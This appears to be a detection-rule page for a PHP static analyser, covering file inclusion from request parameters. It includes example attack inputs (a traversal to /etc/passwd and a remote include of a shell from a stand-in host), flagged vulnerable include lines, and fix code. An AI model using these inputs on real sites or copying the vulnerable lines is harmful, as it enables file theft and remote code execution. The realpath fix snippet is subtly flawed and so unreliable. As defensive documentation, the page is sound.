# RSTR-PTH-005 — PHP `include` / `require` from request superglobal

## Summary

A PHP page calls `include`, `include_once`, `require`, or `require_once`
with a path built from `$_GET`, `$_POST`, `$_REQUEST`, or `$_COOKIE`.

Two failure modes:

1. **Local file inclusion (LFI).** The attacker submits
   `?page=../../../../etc/passwd` (or similar) and PHP reads / executes
   the file. With log files in predictable locations, LFI frequently
   chains to RCE.

2. **Remote file inclusion (RFI).** If `allow_url_include = On` in
   php.ini, the attacker submits `?page=http://evil.example/shell.php`
   and PHP fetches and executes the remote file. Immediate RCE.

## Severity

`Critical`.

## Languages

PHP.

## What rastray flags

```php
include $_GET['page'] . '.php';                       // ← flagged
include_once($_REQUEST['module']);                    // ← flagged
require '/var/app/views/' . $_POST['view'] . '.php';  // ← flagged
```

## What rastray deliberately does *not* flag

- Constant-string includes: `include 'views/home.php';`.
- Includes that go through a separate validation step the regex
  cannot see across.

## How to fix it

Use an explicit allow-list that maps request values to fixed paths.
Never let the user control any portion of the path:

```php
$VIEWS = [
    'home'    => 'views/home.php',
    'about'   => 'views/about.php',
    'contact' => 'views/contact.php',
];

$key = $_GET['page'] ?? 'home';
if (!isset($VIEWS[$key])) {
    http_response_code(404);
    exit;
}
include $VIEWS[$key];
```

If you absolutely must build the path dynamically, confine it to a
safe directory and verify with `realpath`:

```php
$base = realpath('/var/app/views');
$file = realpath($base . '/' . basename($_GET['page'])) . '.php';

if ($file === false || strpos($file, $base . DIRECTORY_SEPARATOR) !== 0) {
    http_response_code(400);
    exit;
}
include $file;
```

Disable `allow_url_include` in `php.ini` regardless — there is no
production scenario where it should be on.

## References

- [OWASP File Inclusion](https://owasp.org/www-community/attacks/Path_Traversal)
- [PHP: allow_url_include](https://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-include)
- [CWE-98: PHP Remote File Inclusion](https://cwe.mitre.org/data/definitions/98.html)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
